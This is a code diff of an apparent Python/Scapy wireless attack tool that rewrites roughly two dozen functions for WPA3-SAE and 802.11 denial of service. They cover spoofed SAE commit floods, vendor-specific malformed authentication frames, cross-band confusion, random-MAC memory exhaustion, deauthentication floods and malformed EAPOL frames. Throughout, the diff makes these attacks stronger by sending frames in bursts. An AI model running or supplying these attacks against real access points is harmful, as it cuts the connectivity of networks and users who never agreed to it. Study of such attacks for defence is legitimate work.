@@ -182,7 +182,7 @@ def get_target_info_from_csv(csv_file_path, all_target_stas):
     return info
 
 def cleanup(proc_dict):
-    print("\n[INFO] Cleaning up and terminating all processes...")
+    print("\n[INFO] Cleanup...")
     for proc in proc_dict.values():
         if proc and isinstance(proc, (Process, subprocess.Popen)):
             try:
@@ -192,182 +192,191 @@ def cleanup(proc_dict):
     for f in glob.glob("scan_result*"):
         try: os.remove(f)
         except OSError: pass
-    print("[INFO] Cleanup completed.")
 
 # =====================================================================================
-# ======================== ATTACK FUNCTIONS (ALL 26) ========================
+# ======================== ATTACK FUNCTIONS (FIXED) ========================
 # =====================================================================================
+
+# --- Helper for sending bursts ---
+def send_burst(packet_list, interface, counter):
+    from scapy.all import sendp
+    if not packet_list: return
+    try:
+        # SCIENTIFIC FIX: inter=0 allows kernel to batch packets (true burst)
+        sendp(packet_list, count=1, inter=0, iface=interface, verbose=0)
+        with counter.get_lock(): counter.value += len(packet_list)
+        time.sleep(0.02) # Short sleep to prevent full lockup
+    except OSError:
+        time.sleep(0.1) # Buffer full recovery
 
 # --- Vendor Specific Attacks ---
 
 def run_case1_denial_of_internet_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
-    print(f"\n[INFO-CASE1] {interface}: Starting Denial of Internet on channel {channel}...")
+    print(f"\n[INFO-CASE1] {interface}: Denial of Internet (Spoofed SAE Commit) on CH {channel}...")
     if not set_channel(interface, channel): return
+    
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
+    
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                sendp(packet, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 1
-            time.sleep(10)
+                # Spoof Client -> AP
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            
+            # Send single frames but efficiently
+            send_burst(burst * 50, interface, counter) 
+            time.sleep(5) # Attack is effective with few frames, no need to flood
     except KeyboardInterrupt: pass
 
 def run_case2_bad_auth_algo_broadcom_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs['bssid'], kwargs['channel']
     if not set_channel(interface, channel): return
+    print(f"\n[INFO-CASE2] {interface}: Bad Algo Broadcom (Burst Mode)...")
+    
     try:
         while True:
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=5, seqnum=1, status=0)
-            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 20
-            time.sleep(0.5)
+            burst = []
+            for _ in range(128):
+                # Unique MACs per burst to fill memory
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=5, seqnum=1, status=0)
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case3_bad_status_code_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
-    print(f"\n[INFO-CASE3] {interface}: Starting Bad Status Code...")
+    print(f"\n[INFO-CASE3] {interface}: Bad Status Code...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
                 PAYLOAD = b'\x00\x00' + os.urandom(32)
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD
-                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 200
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD
+                burst.append(pkt)
+            send_burst(burst * 64, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case4_bad_send_confirm_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
-    print(f"\n[INFO-CASE4] {interface}: Starting Bad Send-Confirm...")
+    print(f"\n[INFO-CASE4] {interface}: Bad Send-Confirm...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
                 PAYLOAD = b'\x11\x11' + os.urandom(32)
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD
-                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 200
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD
+                burst.append(pkt)
+            send_burst(burst * 64, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case5_empty_frame_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
-    print(f"\n[INFO-CASE5] {interface}: Starting Empty Frame...")
+    print(f"\n[INFO-CASE5] {interface}: Empty Frame...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
-                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 200
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
+                burst.append(pkt)
+            send_burst(burst * 64, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case6_radio_confusion_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
-    # Target is 5GHz, so we need 5GHz params, even if we shoot from 2.4GHz
-    bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
-    bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
-    clients_5ghz = kwargs.get('clients', [])
-    if not (bssid_5ghz and channel_5ghz and bssid_2_4ghz and channel_2_4ghz and clients_5ghz): return
-    print(f"\n[INFO-CASE6] {interface}: Starting Radio Confusion (Target 5GHz)...")
-    # This attack uses the SAE payload valid for the TARGET band (5GHz)
+    from scapy.all import RadioTap, Dot11, Dot11Auth
+    
+    # SCIENTIFIC FIX: NO CHANNEL HOPPING. 
+    # Send on 2.4GHz (physical) -> Target 5GHz BSSID (logical)
+    send_channel = kwargs['channel_2_4ghz']
+    target_bssid = kwargs['bssid_5ghz']
+    clients = kwargs.get('clients', [])
+    
+    if not (send_channel and target_bssid and clients): return
+    print(f"\n[INFO-CASE6] {interface}: Radio Confusion. Sending on {send_channel} -> Targeting 5GHz BSSID.")
+    if not set_channel(interface, send_channel): return
+
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
-            if set_channel(interface, channel_2_4ghz):
-                for client in clients_5ghz:
-                    packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=client, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 100
+            burst = []
+            for client in clients:
+                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
             
-            if set_channel(interface, channel_5ghz):
-                for source_mac in clients_5ghz + [bssid_2_4ghz]:
-                    packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=source_mac, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                    sendp(packet, count=50, inter=0.01, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 50
-            time.sleep(2)
+            # Send burst of 128 packets
+            if burst: send_burst(burst * (128 // len(burst) + 1), interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case6_radio_confusion_reverse_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
-    # Target is 2.4GHz, so we need 2.4GHz params
-    bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
-    bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
-    clients_2_4ghz = kwargs.get('clients', [])
-    if not (bssid_5ghz and channel_5ghz and bssid_2_4ghz and channel_2_4ghz and clients_2_4ghz): return
-    print(f"\n[INFO-CASE6-REV] {interface}: Starting Radio Confusion (Target 2.4GHz)...")
+    from scapy.all import RadioTap, Dot11, Dot11Auth
+    
+    # REVERSE: Send on 5GHz -> Target 2.4GHz
+    send_channel = kwargs['channel_5ghz']
+    target_bssid = kwargs['bssid_2_4ghz']
+    clients = kwargs.get('clients', [])
+    
+    if not (send_channel and target_bssid and clients): return
+    print(f"\n[INFO-CASE6-REV] {interface}: Radio Confusion Rev. Sending on {send_channel} -> Targeting 2.4GHz BSSID.")
+    if not set_channel(interface, send_channel): return
+    
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
-            if set_channel(interface, channel_5ghz):
-                for client in clients_2_4ghz:
-                    packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=client, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 100
-
-            if set_channel(interface, channel_2_4ghz):
-                for source_mac in clients_2_4ghz + [bssid_5ghz]:
-                    packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=source_mac, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                    sendp(packet, count=50, inter=0.01, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 50
-            time.sleep(2)
+            burst = []
+            for client in clients:
+                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            if burst: send_burst(burst * (128 // len(burst) + 1), interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case7_back_to_the_future_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs['bssid'], kwargs['channel']
     if not set_channel(interface, channel): return
-    print(f"\n[INFO-CASE7] {interface}: Starting Back to the Future...")
+    print(f"\n[INFO-CASE7] {interface}: Starting Back to the Future (Unique MACs)...")
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
+    
     try:
-        print(f"[INFO-CASE7] {interface}: Phase 1, Memory Flooding...")
-        for i in range(600): # According to study ~3 minutes
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-            sendp(packet, count=128, inter=0.001, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 128
-            time.sleep(0.2)
-        
-        clients = kwargs.get('clients', [])
-        if clients:
-            print(f"[INFO-CASE7] {interface}: Phase 2, targeting clients...")
-            while True:
-                for client in clients:
-                    packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                    sendp(packet, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 1
-                time.sleep(0.1)
+        while True:
+            burst = []
+            # SCIENTIFIC FIX: Generate 128 UNIQUE MACs per burst to fill RAM
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case8_bad_auth_algo_qualcomm_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE8] {interface}: Starting Bad Auth Algo (Qualcomm)...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0] + list(range(7, 100))), seqnum=1, status=0)
-                sendp(packet, count=40, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 40
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0] + list(range(7, 100))), seqnum=1, status=0)
+                burst.append(pkt)
+            send_burst(burst * 20, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case9_bad_sequence_number_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE9] {interface}: Starting Bad Sequence Number...")
@@ -375,30 +384,30 @@ def run_case9_bad_sequence_number_process(interface, counter, **kwargs):
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)/SAE_PAYLOAD
-                sendp(packet, count=20, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 20
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            send_burst(burst * 20, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case10a_bad_auth_body_empty_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE10A] {interface}: Starting Bad Auth Body (Empty)...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))
-                sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 100
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))
+                burst.append(pkt)
+            send_burst(burst * 50, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case10b_bad_auth_body_payload_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE10B] {interface}: Starting Bad Auth Body (Payload)...")
@@ -406,205 +415,214 @@ def run_case10b_bad_auth_body_payload_process(interface, counter, **kwargs):
     BAD_PAYLOAD = bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296')
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))/BAD_PAYLOAD
-                sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 100
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))/BAD_PAYLOAD
+                burst.append(pkt)
+            send_burst(burst * 50, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case11_seq_status_fuzz_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE11] {interface}: Starting Seq/Status Fuzzing...")
     if not set_channel(interface, channel): return
     try:
         client = clients[0]
+        # Fuzzing requires sequential sending, but can still be fast
         for seq_num in range(2):
             status_code = 0
+            burst = []
             for i in range(1000):
                 if i % 100 == 0: status_code = (status_code % 11) + 1
-                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=0, seqnum=seq_num, status=status_code)
-                sendp(packet, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 1
-                time.sleep(0.04)
-        print(f"[INFO-CASE11] {interface}: Fuzzing cycle completed.")
-        time.sleep(10) # Pause before repeating
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=0, seqnum=seq_num, status=status_code)
+                burst.append(pkt)
+                if len(burst) >= 128:
+                    send_burst(burst, interface, counter)
+                    burst = []
+            if burst: send_burst(burst, interface, counter)
+        time.sleep(1)
     except KeyboardInterrupt: pass
 
 def run_case12_bursty_auth_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
+    from scapy.all import RadioTap, Dot11, Dot11Auth
     bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
     if not clients: return
     print(f"\n[INFO-CASE12] {interface}: Starting Bursty Auth (MediaTek)...")
     if not set_channel(interface, channel): return
     try:
         while True:
+            burst = []
             for client in clients:
                 for algo in range(1, 5):
-                    packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=algo, seqnum=1, status=0)
-                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
-                    with counter.get_lock(): counter.value += 100
-            time.sleep(1)
+                    pkt = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=algo, seqnum=1, status=0)
+                    burst.append(pkt)
+            send_burst(burst * 25, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case13_radio_confusion_mediatek_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
-    bssid_5ghz, channel_5ghz = kwargs.get('bssid_5ghz'), kwargs.get('channel_5ghz')
+    from scapy.all import RadioTap, Dot11, Dot11Auth
+    # Target is 2.4GHz, so we send from 5GHz (Cross-Band)
+    send_channel = kwargs.get('channel_5ghz')
+    target_bssid = kwargs.get('bssid_2_4ghz')
     clients = kwargs.get('clients', [])
-    if not (bssid_5ghz and channel_5ghz and clients): return
-    print(f"\n[INFO-CASE13] {interface}: Starting MediaTek Radio Confusion (Target 2.4GHz)...")
-    if not set_channel(interface, channel_5ghz): return
+    
+    if not (send_channel and target_bssid and clients): return
+    print(f"\n[INFO-CASE13] {interface}: MediaTek Cross-Band. Sending on {send_channel} -> Targeting 2.4GHz.")
+    if not set_channel(interface, send_channel): return
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=client, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                sendp(packet, count=128, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 128
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            if burst: send_burst(burst * 64, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_case13_radio_confusion_mediatek_reverse_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
-    bssid_2_4ghz, channel_2_4ghz = kwargs.get('bssid_2_4ghz'), kwargs.get('channel_2_4ghz')
+    from scapy.all import RadioTap, Dot11, Dot11Auth
+    # Target is 5GHz, so we send from 2.4GHz (Cross-Band)
+    send_channel = kwargs.get('channel_2_4ghz')
+    target_bssid = kwargs.get('bssid_5ghz')
     clients = kwargs.get('clients', [])
-    if not (bssid_2_4ghz and channel_2_4ghz and clients): return
-    print(f"\n[INFO-CASE13-REV] {interface}: Starting MediaTek Radio Confusion (Target 5GHz)...")
-    if not set_channel(interface, channel_2_4ghz): return
+    
+    if not (send_channel and target_bssid and clients): return
+    print(f"\n[INFO-CASE13-REV] {interface}: MediaTek Cross-Band Rev. Sending on {send_channel} -> Targeting 5GHz.")
+    if not set_channel(interface, send_channel): return
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
+            burst = []
             for client in clients:
-                packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=client, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
-                sendp(packet, count=128, inter=0.01, iface=interface, verbose=0)
-                with counter.get_lock(): counter.value += 128
-            time.sleep(1)
+                pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
+                burst.append(pkt)
+            if burst: send_burst(burst * 64, interface, counter)
     except KeyboardInterrupt: pass
 
 # --- Client Direct Attacks ---
 
 def run_deauth_flood_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
+    from scapy.all import RadioTap, Dot11, Dot11Deauth
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
     print(f"[INFO-DEAUTH] {interface}: Starting Deauth Flood...")
     if not set_channel(interface, channel): return
-    client_index = 0
     try:
         while True:
-            client = clients[client_index % len(clients)]
-            p1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
-            p2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
-            sendp([p1, p2], count=64, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 128
-            client_index += 1
-            time.sleep(1)
+            burst = []
+            for client in clients:
+                p1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+                p2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
+                burst.extend([p1, p2])
+            send_burst(burst * 32, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_pmf_deauth_exploit_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
+    from scapy.all import RadioTap, Dot11, Dot11Deauth
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
     print(f"[INFO-PMF] {interface}: Starting PMF Deauth Exploit...")
     if not set_channel(interface, channel): return
-    client_index = 0
     try:
         while True:
-            client = clients[client_index % len(clients)]
-            packet = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
-            sendp(packet, count=60, inter=0.02, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 60
-            client_index += 1
-            time.sleep(1)
+            burst = []
+            for client in clients:
+                pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
+                burst.append(pkt)
+            send_burst(burst * 50, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_malformed_msg1_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, EAPOL
+    from scapy.all import RadioTap, Dot11, EAPOL
     bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
     if not clients: return
     print(f"[INFO-MALFORMED] {interface}: Starting Malformed MSG1...")
     if not set_channel(interface, channel): return
-    client_index = 0
     try:
         while True:
-            client = clients[client_index % len(clients)]
+            burst = []
             payload = b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80)
-            packet = RadioTap()/Dot11(type=2, subtype=8, addr1=client, addr2=bssid, addr3=bssid)/EAPOL(version=1, type=3)/payload
-            sendp(packet, count=10, inter=0.01, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 10
-            client_index += 1
-            time.sleep(1)
+            for client in clients:
+                pkt = RadioTap()/Dot11(type=2, subtype=8, addr1=client, addr2=bssid, addr3=bssid)/EAPOL(version=1, type=3)/payload
+                burst.append(pkt)
+            send_burst(burst * 10, interface, counter)
     except KeyboardInterrupt: pass
 
 # --- Generic WPA3-SAE Attacks ---
 
 def run_bad_algo_generic_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
     print(f"[INFO-BAD-ALGO] {interface}: Starting Bad Algo (Generic)...")
     try:
         while True:
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=random.choice([0,1,2,4,5]))
-            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 20
-            time.sleep(0.5)
+            burst = []
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=random.choice([0,1,2,4,5]))
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_bad_seq_generic_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
     print(f"[INFO-BAD-SEQ] {interface}: Starting Bad Seq (Generic)...")
     SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
     try:
         while True:
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=random.choice([0,3,4]))/SAE_PAYLOAD
-            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 20
-            time.sleep(0.5)
+            burst = []
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=random.choice([0,3,4]))/SAE_PAYLOAD
+                burst.append(pkt)
+            send_burst(burst, interface, counter)
     except KeyboardInterrupt: pass
 
 def run_bad_status_code_generic_process(interface, counter, **kwargs):
-    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
+    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC
     bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
     if not set_channel(interface, channel): return
     print(f"[INFO-BAD-STATUS-GENERIC] {interface}: Starting Bad Status (Generic)...")
     try:
         while True:
-            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
-            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
-            with counter.get_lock(): counter.value += 20
-            time.sleep(0.5)
+            burst = []
+            for _ in range(128):
+                pkt = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
+                burst.append(pkt)
